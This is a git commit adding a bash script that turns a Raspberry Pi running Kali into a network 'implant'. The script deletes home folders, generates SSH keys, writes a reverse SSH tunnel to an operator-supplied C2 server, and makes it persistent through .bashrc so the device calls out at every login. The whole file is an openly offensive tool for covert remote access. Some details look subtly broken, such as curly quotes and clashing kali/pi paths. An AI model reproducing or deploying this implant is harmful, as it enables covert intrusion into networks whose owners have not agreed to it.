0fb8a882dcf9e772d65b8a21d0ab79be5df8ffc2
assume-breach <76174163+assume-breach@users.noreply.github.com>
2022-12-28 08:53:10 -0500

    Create PiMPlantKali.sh

---
+++ PiMPlant/PiMPlantKali.sh
@@ -0,0 +1,51 @@
+#!/bin/bash 
+cat << "EOF"
+██████╗ ██╗███╗   ███╗██████╗ ██╗      █████╗ ███╗   ██╗████████╗    
+██╔══██╗██║████╗ ████║██╔══██╗██║     ██╔══██╗████╗  ██║╚══██╔══╝    
+██████╔╝██║██╔████╔██║██████╔╝██║     ███████║██╔██╗ ██║   ██║       
+██╔═══╝ ██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══██║██║╚██╗██║   ██║       
+██║     ██║██║ ╚═╝ ██║██║     ███████╗██║  ██║██║ ╚████║   ██║       
+╚═╝     ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝       
+                                                                     
+███████╗ ██████╗██████╗ ██╗██████╗ ████████╗                         
+██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝                         
+███████╗██║     ██████╔╝██║██████╔╝   ██║                            
+╚════██║██║     ██╔══██╗██║██╔═══╝    ██║                            
+███████║╚██████╗██║  ██║██║██║        ██║                            
+╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝                            
+EOF
+echo ""
+echo "Welcome To The PiMPlant Script!"
+sleep 4
+echo ""
+echo "Let's Update Your Implant"
+echo ""
+apt-get update -y && apt-get upgrade -y
+echo "Removing Unneeded Directories"
+rm -rf Videos/
+rm -rf Music/
+rm -rf Public/
+rm -rf Templates/
+rm -rf Bookshelf/
+echo ""
+cd /home/kali/
+ssh-keygen
+echo "Enter Your C2 Server's IP/Domain"
+read C2IP
+sleep 2
+echo ""
+echo "Time For Some Reverse SSH"
+sleep 3
+touch rev.sh
+echo “#!/bin/bash” >> rev.sh
+echo "ssh -N -R 2222:localhost:22 root@$C2IP" >> rev.sh
+sudo chmod +x rev.sh
+chown pi:pi rev.sh
+echo "sleep 15 && bash /home/kali/rev.sh" >> /home/pi/.bashrc
+ssh-copy-id -i ~/.ssh/id_rsa.pub root@$C2IP
+echo "All Is Complete"
+sleep 2
+echo "Your Implant Is Configured"
+sleep 2
+echo ""
+echo "Reboot for changes to take effect"
